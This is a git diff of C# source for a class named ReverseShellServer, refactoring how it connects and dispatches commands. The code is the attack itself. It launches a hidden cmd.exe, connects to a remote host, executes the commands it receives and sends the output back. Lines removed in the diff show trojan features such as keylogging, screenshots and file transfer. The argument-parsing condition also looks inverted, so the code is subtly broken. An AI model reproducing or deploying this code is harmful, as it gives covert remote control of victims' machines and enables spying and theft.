@@ -1,7 +1,10 @@
-﻿using System;
+﻿using Commands;
+using NetworkManager;
+using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Net.Sockets;
+using System.Linq;
 using System.Text;
 using System.Threading;
 
@@ -9,16 +12,9 @@ namespace ReverseShellServer
 {
     public class ServerManager
     {
-        TcpClient tcpClient;
-        NetworkStream networkStream;
-        StreamWriter streamWriter;
-        StreamReader streamReader;
-        BinaryWriter binaryWriter;
-        BinaryReader binaryReader;
-        Process processCmd;
-        StringBuilder strInput;
-        
-        ServerTools tools;
+        Process processCmd { get; }
+
+        StringBuilder strInput { get; }
 
 
         public ServerManager()
@@ -29,6 +25,25 @@ namespace ReverseShellServer
             {
                 Environment.Exit(0);
             }
+
+            strInput = new StringBuilder();
+
+            processCmd = new Process
+            {
+                StartInfo =
+                {
+                    FileName = "cmd.exe",
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    StandardOutputEncoding = Encoding.GetEncoding(850),
+                    RedirectStandardOutput = true,
+                    RedirectStandardInput = true,
+                    RedirectStandardError = true
+                },
+            };
+            processCmd.OutputDataReceived += CmdOutputDataHandler;
+            processCmd.Start();
+            processCmd.BeginOutputReadLine();
         }
 
 
@@ -44,48 +59,18 @@ namespace ReverseShellServer
 
         void RunServer(string remoteAdress, int remotePort)
         {
-            tcpClient = new TcpClient();
-            strInput = new StringBuilder();
-            if (!tcpClient.Connected)
+            if (!GlobalNetworkManager.ServerNetworkManager.ConnectToClient(remoteAdress, remotePort))
             {
-                try
-                {
-                    tcpClient.Connect(remoteAdress, remotePort);
-
-                    networkStream = tcpClient.GetStream();
-                    streamReader = new StreamReader(networkStream);
-                    streamWriter = new StreamWriter(networkStream);
-                    binaryWriter = new BinaryWriter(networkStream);
-                    binaryReader = new BinaryReader(networkStream);
-                }
-                catch (Exception) { return; } // if no Client, don't continue 
-
-                tools = new ServerTools(binaryWriter, binaryReader, streamWriter);
-
-                processCmd = new Process
-                {
-                    StartInfo =
-                    {
-                        FileName = "cmd.exe",
-                        CreateNoWindow = true,
-                        UseShellExecute = false,
-                        StandardOutputEncoding = Encoding.GetEncoding(850),
-                        RedirectStandardOutput = true,
-                        RedirectStandardInput = true,
-                        RedirectStandardError = true
-                    }
-                };
-                processCmd.OutputDataReceived += CmdOutputDataHandler;
-                processCmd.Start();
-                processCmd.BeginOutputReadLine();
+                return;
             }
 
+            SayHelloToCmd();
 
             while (true)
             {
                 try
                 {
-                    strInput.Append(streamReader.ReadLine());
+                    strInput.Append(GlobalNetworkManager.ReadLine());
                     ProcessCommand();
                     strInput.Clear();
                 }
@@ -100,41 +85,33 @@ namespace ReverseShellServer
 
         void ProcessCommand()
         {
-            var command = strInput.ToString().Split(' ');
-            var bypassHello = false;
-            
-            switch (command[0])
+            var splittedCommand = strInput.ToString().Split(' ').ToList();
+            var commandName = splittedCommand[0];
+            var arguments = new List<string>();
+
+            if (splittedCommand.Count == 1)
             {
-                case "terminate":
-                    StopServer();
-                    break;
-                case "exit":
-                    throw new ArgumentException();
-                case "screenshot":
-                    tools.TakeAndSendScreenShotToClient();
-                    break;
-                case "downloadurl":
-                    tools.DownloadFileFromUrl(command[1]);
-                    break;
-                case "download":
-                    tools.UploadFileToClient(command[1]);
-                    break;
-                case "upload":
-                    tools.ReceiveFileFromClient(command[1]);
-                    break;
-                case "keylogger":
-                    tools.ProcessKeyloggerCommand(command[1]);
-                    break;
-                default:
-                    strInput.Append("\n");
-                    processCmd.StandardInput.WriteLine(strInput);
-                    bypassHello = true;
-                    break;
+                arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
             }
 
-            if (!bypassHello)
+            var command = CommandsManager.GetCommandByName(commandName);
+            if (command != null)
             {
+                try
+                {
+                    command.ServerMethod(arguments);
+                }
+                catch (ArgumentException)
+                {
+                    // When the server method returns an ArgumentException, it means it should stop
+                    StopServer();
+                }
                 SayHelloToCmd();
+            }
+            else
+            {
+                strInput.Append("\n");
+                processCmd.StandardInput.WriteLine(strInput);
             }
         }
 
@@ -144,32 +121,6 @@ namespace ReverseShellServer
             strInput.Clear();
             strInput.Append("Hello !\n");
             processCmd.StandardInput.WriteLine(strInput);
-        }
-
-
-        void Cleanup()
-        {
-            try
-            {
-                processCmd.Kill();
-            }
-            catch (Exception)
-            {
-                // ignored
-            }
-
-            streamReader.Close();
-            streamWriter.Close();
-            binaryReader.Close();
-            binaryWriter.Close();
-            networkStream.Close();
-        }
-
-
-        void StopServer()
-        {
-            Cleanup();
-            Environment.Exit(Environment.ExitCode);
         }
 
 
@@ -198,14 +149,35 @@ namespace ReverseShellServer
                         Directory.SetCurrentDirectory(output.Substring(0, output.Length - 1));
                     }
                     
-                    streamWriter.WriteLine(output);
-                    streamWriter.Flush();
+                    GlobalNetworkManager.WriteLine(output);
                 }
                 catch (Exception)
                 {
                     // ignored
                 }
             }
+            
+        }
+
+
+        void Cleanup()
+        {
+            try
+            {
+                processCmd.Kill();
+                GlobalNetworkManager.ServerNetworkManager.Cleanup();
+            }
+            catch (Exception)
+            {
+                // ignored
+            }
+        }
+
+
+        void StopServer()
+        {
+            Cleanup();
+            Environment.Exit(Environment.ExitCode);
         }
     }
 }
